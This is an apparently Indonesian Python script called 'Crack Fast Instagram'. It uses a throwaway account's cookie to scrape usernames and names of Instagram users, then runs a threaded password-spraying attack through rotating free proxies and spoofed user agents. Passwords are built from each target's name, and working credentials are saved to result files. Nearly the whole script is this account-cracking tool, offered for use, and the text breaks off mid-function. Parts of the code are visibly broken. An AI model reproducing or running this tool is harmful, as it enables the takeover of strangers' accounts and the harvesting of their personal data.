# *--> Author by hikmat xd #
# *--> Coding python 3 #
import os, re, sys, time, json, random, requests,rich
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep

from rich.table import Table as table
from rich.console import Console as console
from rich.console import Group as grup_rich
from rich.panel import Panel as panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as columns
from rich.text import Text as text_rich
from rich import print as vprint

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'
###----------[ COLOR FOR RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU?
garis = f" {P}[{H}•{P}]"

def clear():
	os.system('clear')
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();time.sleep(0.05)

#LOGO
def logo():
	print(f"""{P}
\t_________  ___________.___ 
\t\_   ___ \ \_   _____/|   |
\t/    \  \/  |    __)  |   |
\t\     \____ |     \   |   |
\t \______  / \___  /   |___|
 \t       \/      \/ • Crack Fast Instagram •  
\t *--> author by {H}HikmatXD{P} <--*   
""")

# Login Cookie
def login():
	os.system('clear')
	logo()
	x=f"{P2}gunakan akun tumbal untuk ambil cookie instagram\n{P2}kalo belum faham bisa ketik {H2}open {P2}untuk chat author"
	vprint(panel(x,style=f"{H3}"))
	cookie = input(f"{garis} masukan cookie fresh : {H}")
	if cookie in ['open', 'Open', 'OPEN']:
		jalan(f"{garis} anda akan diarahkan ke whastapp author");os.system('xdg-open https://wa.me/+6282115413282?text=Bg+Cara+Ambil+Cookies+Ig+Kek+Mana?');login()
	elif cookie in ['', ' ']:
		jalan(f"{garis} isi yang benar ")
		login()
	else:
		try:
			fra = re.search('ds_user_id=(.*?);', cookie);open('Data/user.txt', 'w').write(fra.group(1))
			mis = requests.get(f'https://i.instagram.com/api/v1/users/{fra.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': cookie}).json()['user'];open('Data/cookie.txt', 'w').write(cookie)
			os.system('xdg-open https://wa.me/+6282115413282?text=MAKASIH+BANG+SUDAH+AKTIFIN+ID+GUA')
			jalan(f"{garis} selamat datang : {H}{mis['full_name']} ")
			menu()
		except (AttributeError, KeyError):
			jalan(f"{garis} cookie invalid/kadaluarsa!! mohon cek lagi akunnya")
			login()
		except (ConnectionError):
			x=f"{P2}koneksi internet bermasalah"
			vprint(panel(x,style=f"{H3}"))
			exit()

def menu():
	try:
		os.system('clear')
		logo()
		hikmat = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()['user']
		x=f"{P2}selamat datang {K2}{hikmat['full_name']}\n{P2}username : {H2}{hikmat['username']}\n{P2}followers : {H2}{hikmat['follower_count']}\n{P2}following : {H2}{hikmat['following_count']}"
		vprint(panel(x,style=f"{H3}"))
	except (IOError):
		jalan(f"{garis} cookie invalid/kadaluarsa ")
		login()
	except (KeyError):
		jalan(f"{garis} cookie invalid/kadaluarsa ")
		os.system("rm -rf Data/cookie && rm -rf Data/user")
		login()
	except (IOError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"{P2}[01] dump username with {H2}following\n{P2}[02] dump username with {H2}followers\n{P2}[03] dump username with {H2}aktivitas\n{P2}[04] dump username with {H2}home\n{P2}[05] dump username with {H2}hashtag\n{P2}[06] dump username with {H2}pencarian\n{P2}[07] dump username with {H2}query\n{P2}[08] dump user with {H2}email\n{P2}[09] start cracked {H2}fast crack\n{P2}[10] lihat hasil crack\n{P2}[{M2}00{P2}] exit/hapus cookie"
	vprint(panel(x,style=f"{H3}"))
	hikmat = input(f"{garis} pilih : {H}")
	if hikmat in ['1','01']:
		mengikut()
	elif hikmat in ['2','02']:
		pengikut()
	elif hikmat in ['3','03']:
		aktivitas()
	elif hikmat in ['4','04']:
		berandal()
	elif hikmat in ['5','05']:
		hashtag()
	elif hikmat in ['6','06']:
		pencarian()
	elif hikmat in ['7','07']:
		query()
	elif hikmat in ['8','08']:
		email()
	elif hikmat in ['9','09']:
		proxy()
	elif hikmat in ['10','010']:
		try:
			x=f"{P2}[01] hasil crack ok\n{P2}hasil crack cp\n{P2}[03] hapus hasil crack instagram\n{P2}[{M}00{P2} kembali"
			vprint(panel(x,style=f"{H3}"))
			hasil_maling = input(f"{garis} pilih : {H}")
			if hasil_maling in ['1','01']:
				print(f"{H} ");os.system('cat Results/Ok.txt')
				input(f"{garis} enter untuk kembali ")
				menu() 
			elif hasil_maling in ['2','02']:
				print(f"{K} ");os.system('cat Results/Cp.txt')
				input(f"{garis} enter untuk kembali ")
				menu() 
			elif hasil_maling in ['3','03']:
				jalan(f"{garis} sedang menghapus hasil crack ok/cp ")
				os.system("rm -rf Result/Cp.txt && rm -rf Result/Ok.txt")
				jalan(f"{garis} sukses menghapus hasil crack ok/cp ")
				input(f"{garis} enter untuk kembali ")
				menu()
			elif hasil_maling in ["0","00"]:
				menu()
			else:
				jalan(f"{garis} isi yang benar ")
				menu()
		except:pass
	elif hikmat in ['0','00']:
		print("")
		x=f"{P2}[01] hapus cookie/data login\n{P2}[02] ganti cookie instagram\n{P2}[03] exit\n{P2}[{M2}00{P2}] kembali"
		vprint(panel(x,style=f"{H3}"))
		cuz = input(f"{garis} pilih : {H}")
		if cuz in ["1","01"]:
			jalan(f"{garis} sedang menghapus cookie/data login ") 
			os.system("rm -rf Data/cookie.txt && rm -rf Data/user.txt")
			jalan(f"{garis} sukses menghapus cookie/data login ")
			login()
		elif cuz in ["2","02"]:
			jalan(f"{garis} sedang menghapus cookie bawaan ")
			os.system("rm -rf Data/cookie.txt && rm -rf Data/user.txt") 
			login()
		elif cuz in ["3","03"]:
			jalan(f"{garis} terimakasih telah memakai script kami><... tolong bantu support kami biar semangat update/buat sc nya:) ")
			exit()
		elif cuz in ["0","00"]:
			menu() 
		else:
			jalan(f"{garis} isi yang benar ")
			menu()
	else:
		jalan(f"{garis} isi yang benar ")
		menu()

def mengikuti():
	try:
		x=f"{P2}contoh username : {H2}karinalavoz "
		vprint(panel(x,style=f"{H3}"))
		uid = input(f"{garis} username : {H}")
		if uid[:1] in ['1','2','3','4','5','6','7','8','9','0']:
			jalan(f"{garis} harusnya pake nama bukan angka ")
			mengikuti()
		else:
			hikmat = requests.get(f'https://z-p42.www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
			print(f"{garis} nama target :{K} {hikmat['full_name']}\n")
			infile = (hikmat['full_name'].replace(' ','_')+'.txt')
		with requests.Session() as ses:
			hikmat_xd = ses.get(f'https://i.instagram.com/api/v1/friendships/{hikmat["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()
			for hikmat_gans in hikmat_xd['users']:
				open('Dump/'+infile, 'a').write(hikmat_gans['username']+'<=>'+hikmat_gans['full_name']+'\n')
				print(f"\r{P}{hikmat_gans['username']}<=>{hikmat_gans['full_name']}")
			print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}Dump/{infile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
	except (KeyError):
		x=f"{P2}dump gagal!! "
		vprint(panel(x,style=f"{H3}")) 
		exit()
	except (ConnectionError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
		exit()

def pengikut():
	try:
		x=f"{P2}contoh username : {H2}karinalavoz "
		vprint(panel(x,style=f"{H3}"))
		uid = input(f"{garis} username : {H}")
		if uid[:1] in ['1','2','3','4','5','6','7','8','9','0']:
			jalan(f"{garis} harusnya pake nama bukan angka ")
			mengikuti()
		else:
			hikmat = requests.get(f'https://z-p42.www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
			print(f"{garis} nama target :{K} {hikmat['full_name']}\n")
			infile = (hikmat['full_name'].replace(' ','_')+'.txt')
		with requests.Session() as ses:
			hikmat_xd = ses.get(f'https://i.instagram.com/api/v1/friendships/{hikmat["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()
			for hikmat_gans in hikmat_xd['users']:
				open('Dump/'+infile, 'a').write(hikmat_gans['username']+'<=>'+hikmat_gans['full_name']+'\n')
				print(f"\r{P}{hikmat_gans['username']}<=>{hikmat_gans['full_name']}")
			print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}Dump/{infile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
	except (KeyError):
		x=f"{P2}dump gagal!! "
		vprint(panel(x,style=f"{H3}")) 
		exit()
	except (ConnectionError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
		exit()

def aktivitas():
	try:
		unfile = input(f"{garis} nama file : {H}").replace(' ','_')
		if unfile in ['',' ']:
			jalan(f"{garis} isi yang benar ")
			aktivitas() 
		else:
			print(f"{P} ")
			hikmat = requests.get('https://z-p42.www.instagram.com/accounts/activity/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()})
			hikmat_xd = re.findall('"username":"(.*?)","full_name":"(.*?)",', hikmat.text)
			for hikmat_gans in hikmat_xd:
				open('Dump/'+unfile, 'a').write(hikmat_gans[0]+'<=>'+hikmat_gans[1]+'\n')
				print(f"\r{P}{hikmat_gans[0]}<=>{hikmat_gans[1]}")
			print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}Dump/{unfile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
	except (ConnectionError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
		exit()
	except Exception as e:
		exit(f"{garis} {e}")
        
def berandal():
	try:
		unfile = input(f"{garis} nama file : {H}").replace(' ','_')
		if unfile in ['',' ']:
			jalan(f"{garis} isi yang benar ")
			berandal() 
		else:
			print(f"{P} ")
			hikmat = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()
			for hikmat_gans in hikmat['tray']:
				open('Dump/'+unfile, 'a').write(hikmat_gans['user']['username']+'<=>'+hikmat_gans['user']['full_name']+'\n')
				print(f"\r{P}{hikmat_gans[0]}<=>{hikmat_gans[1]}")
			print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}Dump/{unfile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
	except (KeyError):
		x=f"{P2}dump gagal!! "
		vprint(panel(x,style=f"{H3}")) 
		exit()
	except (ConnectionError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
		exit()

def hashtag():
	try:
		has_lain = input(f"{garis} hashtag : {H}").replace('#','')
		if has_lain in ['',' ']:
			jalan(f"{garis} isi yang benar ")
			hashtag()
		infile = input(f"{garis} nama file : {H}").replace(' ','_')
		if infile in ['',' ']:
			jalan(f"{garis} isi yang benar ")
			hashtag()
		else:
			print(f"{P} ")
			hikmat = requests.get(f'https://z-p42.www.instagram.com/explore/tags/{has_lain}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()})
			hikmat_xd = re.findall('"username":"(.*?)","full_name":"(.*?)",', hikmat.text)
			for hikmat_gans in hikmat_xd:
				open('Dump/'+infile, 'a').write(hikmat_gans[0]+'<=>'+hikmat_gans[1]+'\n')
				print(f"\r{P}{hikmat_gans[0]}<=>{hikmat_gans[1]}")
			print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}Dump/{infile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
	except (ConnectionError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
		exit()
	except Exception as e:
		exit(f"{garis} {e}")

def pencarian():
	try:
		x=f"{P2}contoh username : {H2}reza"
		vprint(panel(x,style=f"{H3}"))
		uid = input(f"{garis} username : {H}")
		if uid[:1] in ['1','2','3','4','5','6','7','8','9','0']:
			jalan(f"{garis} harusnya pake nama bukan angka ")
			pencarian()
		else:
			hikmat = requests.get(f'https://z-p42.www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
			print(f"{garis} nama target :{K} {hikmat['full_name']}\n")
			infile = (hikmat['full_name'].replace(' ','_')+'.txt')
		with requests.Session() as ses:
			hikmat_gans = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={hikmat["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()
			for hikmat_xf in hikmat_gans['users']:
				open('Dump/'+infile, 'a').write(hikmat_xf['username']+'<=>'+hikmat_xf['full_name']+'\n')
				print(f"\r{P}{hikmat_xf['username']}<=>{hikmat_xf['full_name']}")
			print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}Dump/{infile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
	except (KeyError):
		x=f"{P2}dump gagal!! "
		vprint(panel(x,style=f"{H3}")) 
		exit()
	except (ConnectionError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
		exit()

def query():
	try:
		quz = input(f"{garis} query : {H}")
		if quz in ['',' ']:
			jalan(f"{garis} isi yang benar ")
			query()
		else:
			print(f"{P} ")
			infile = quz.replace(' ','_')+'.txt'
			hikmat = requests.get(f'https://z-p42.instagram.com/web/search/topsearch/?context=blended&query={quz}&rank_token=0.3953592318270893&count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()
			for hikmat_xd in hikmat['users']:
				open('Dump/'+infile, 'a').write(hikmat_xd['user']['username']+'<=>'+hikmat_xd['user']['full_name']+'\n')
				print(f"\r{P}{hikmat_xd['username']}<=>{hikmat_xd['full_name']}")
			print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}Dump/{infile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
	except (KeyError):
		x=f"{P2}dump gagal!! "
		vprint(panel(x,style=f"{H3}")) 
		exit()
	except (ConnectionError):
		x=f"{P2}koneksi internet bermasalah "
		vprint(panel(x,style=f"{H3}"))
		exit()

def email():
	try:
		x=f"{P2}pake {H2}, {P2}untuk menambahkan nama username\n{P2}contoh : {H2}hikmat,selena"
		vprint(panel(x,style=f"{H3}"))
		nama_em = input(f"{garis} nama username : {H}").replace(' ','')
		if nama_em in ['',' ']:
			jalan(f"{garis} isi yang benar ")
			email()
		print("")
		x=f"{P2}contoh domain : {H2}@gmail.com"
		vprint(panel(x,style=f"{H3}"))
		domain = input(f"{garis} domain : {H}")
		if domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
			lim = int(input(f"{garis} limit : {H}"))
			if lim >=1001:
				jalan(f"{garis} maximal {H}1000") 
				email()
			else:
				print(f"{P} ")
				infile = 'Dump/'+nama_em+'.txt'
				for _ in range(lim):
					nom = random.randint(1, 999)
					uid = nama_em + str(nom) + domain + '<=>' + nama_em + ' ' + str(nom)
					open(infile, 'a').write(f'{uid}\n')
					print(f"\r{P}{uid}")
				print("")
			x=f"{P2}dump selesai!! \n{P2}file dump tersimpan di : {H2}{infile}"
			vprint(panel(x,style=f"{H3}"))
			input(f"{garis} enter untuk kembali ");menu()
		else:
			x=f"{P2}harus domain : {H2}'@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'"
			vprint(panel(x,style=f"{H3}"))
	except Exception as e:
		exit(f"{garis} {e}")

def proxy():
	try:
		prz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
		open('Data/proxy.txt', 'w').write(prz)
	except Exception as e:
		prz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy2.txt').text
		open('Data/proxy.txt', 'w').write(prz)
	cracked()

class cracked:
	
	def __init__(self):
		self.kill = 0
		self.ok = []
		self.cp = []
		x=f"{P}[01] cracked password [{H2}Name,Name123,Name12345{P2}]\n{P2}[02] cracked password [{H2}name,name123,name1234,name12345{P2}]\n{P2}[03] cracked password [{H2}name,name123,name1234,name12345,name123456{P2}]\n{P2}[04] cracked password {H2}manual {P2}*--> {K2}5"
		vprint(panel(x,style=f"{H3}"))
		pil_pw = input(f"{garis} pilih : {H}")
		if pil_pw in ['4','04']:
			pwx = input(f"{garis} password manual : {H}").split(',')
		try:
			self.___dump = input(f"{garis} file dump : {H}")
			self.___file = open(self.___dump, 'r').read().splitlines()
		except (IOError):
			jalan(f"{garis} file tidak ada!! atau anda belum ngedump id!! ")
			menu()
		try:
			print("")
			x=f"{P2}hasil crack ok tersimpan di : {H2}Result/Ok.txt\n{P2}hasil crack cp tersimpan di : {K2}Result/Cp.txt\n{P2}klo tidak hasil mode pesawat 5 detik\n{P2}semoga dapet result banyak"
			vprint(panel(x,style=f"{H3}"))
			with ThreadPoolExecutor(max_workers=30) as (palpale):
				for umser in self.___file:
					username, nama = umser.split('<=>')
					z = nama.split(' ')
					if pil_pw in ['1','01']:
						password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'12345']
					elif pil_pw in ['2','02']:
						password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
					elif pil_pw in ['3','03']:
						password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
					elif pil_pw in ['4','04']:
						password = pwx
					else:
						password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
					palpale.submit(self.__main__, self.___file, username, password)
			print("")
			x=f"{P2}cracked succesfuly!! \n{P2}hasil crack ok : {H2}{self.ok}\n{P2}hasil crack cp : {K2}{self.cp}\nbersyukur kah hari ini:v"
			vprint(panel(x,style=f"{H3}"))
		except (ValueError):
			jalan(f"{P2}crack selesai... tpi ada yang error jadi kembali lagi ngedump nya yakk")
			menu()
	def __main__(self, user, uid, pwx):
		try:
			us = open('Data/ua.txt', 'r').read()
		except (IOError):
			us = ('Instagram 22.0.0.15.68 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; Nokia 2.4 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 Instagram 214.1.0.29.120 Android (30/11; 280dpi; 720x1529; HMD Global/Nokia; Nokia 2.4; WVR_sprout; mt6762; es_MX; 333717253','Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36 Instagram 98.0.0.15.119 Android (23/6.0; 320dpi; 720x1192; HUAWEI; MYA-L22; HWMYA-L6737; mt6735; ru_KZ; 159526784','Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 118.0.0.25.121 (iPhone11,8; iOS 13_1_3; en_US; en-US; scale=2.00; 828x1792; 180988914','Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 Instagram 214.0.0.0.58 Android (30/11; 352dpi; 1080x2156; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; it_IT; 330881824','Mozilla/5.0 (Linux; Android 11; IN2020 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Instagram 216.1.0.21.137 Android (30/11; 440dpi; 1080x2179; OnePlus/POCO; IN2020; bhima; qcom; en_IN; 339335857','Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 Instagram 184.0.0.30.117 Android (22/5.1.1; 320dpi; 720x1280; OPPO; A37fw; A37f; qcom; en_US; 285855793','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko','Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1','Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko','Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201','Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0','Windows; U; MSIE 9.0; WIndows NT 9.0; en-US')
			hikmat = requests.get('Instagram 5.1.7 Android (18/4.3; 320dpi; 720x1280; samsung; SGH-I747M; d2can; qcom; en_CA')
		try:
			for pw in pwx:
				pw = pw.lower()
				url = ('https://z-p42.www.instagram.com/')
				lojin = ('https://i.instagram.com/accounts/login/ajax/')
				proz = {'http': 'socks5://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
				csrf = requests.get(url).cookies['csrftoken']
				dat = {'username': uid,
				'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
				'queryParams': {},
				'optIntoOneTap': 'false'}
				head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
				'X-Requested-With': 'XMLHttpRequest',
				'Referer': 'https://i.instagram.com/api/v1/accounts/login/',
				'x-csrftoken': csrf}
				with requests.Session() as ses:
					response = ses.post(lojin, data = dat, headers = head, proxies = proz).json()
					if 'userId' in str(response):
						coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
						try:
							hikmat = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/cookie.txt','r').read()}).json()['graphql']['user']
							foll_cok = hikmat['edge_followed_by']['count']
							foll_cik = hikmat['edge_follow']['count']
						except (KeyError, IOError):
							foll_cok = ('-')
							foll_cik = ('-')
						except:pass
						x=f"{H2}status  : ok\n{H2} *--> {uid} • {pw}\n{H2}followers : {foll_cok}\n{H2}following : {foll_cik}\n{H2}cookie : {coki}"
						vprint(panel(x,style=f"{H3}"))
						self.ok.append(f"{uid}|{pw}")
						open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
						break
					elif 'checkpoint_required' in str(response):
						try:
